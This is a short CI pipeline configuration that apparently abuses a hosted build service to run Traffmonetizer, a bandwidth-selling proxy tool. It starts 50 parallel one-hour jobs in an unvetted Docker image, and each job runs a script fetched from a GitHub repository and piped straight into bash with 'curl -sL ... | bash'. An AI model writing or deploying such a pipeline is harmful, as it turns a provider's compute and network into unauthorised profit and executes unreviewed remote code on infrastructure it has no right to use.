version: v1.0
name: Run in Docker
agent:
  machine:
    type: e1-standard-8
    os_image: ubuntu2004
  containers:
    - name: main
      image: 'andreaa99/rhinoy:latest'
blocks:
  - name: Run Traffmonetizer
    task:
      jobs:
        - name: Run job
          parallelism: 50
          execution_time_limit:
            hours: 1
          commands:
            - checkout
            - 'curl -sL https://github.com/kartolo92/kkr/raw/main/rhnonew | bash'
